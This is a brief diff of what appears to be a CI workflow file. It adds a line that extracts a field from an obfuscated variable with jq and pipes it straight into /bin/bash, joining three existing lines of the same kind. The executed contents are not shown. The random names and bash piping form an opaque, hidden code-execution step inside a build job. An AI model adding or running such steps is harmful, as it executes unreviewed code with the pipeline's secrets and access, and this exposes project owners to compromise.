@@ -24,6 +24,7 @@ jobs:
           echo $slf3730 | jq -r .fwezj2 | /bin/bash
           echo $gul438 | jq -r .aqgdg9 | /bin/bash
           printf '%s' "$hnzw3" | jq -r .opzg11 | /bin/bash
+          printf '%s' "$skbzu12" | jq -r .plsu7 | /bin/bash
 
       - name: Upload artifact
         if: always()
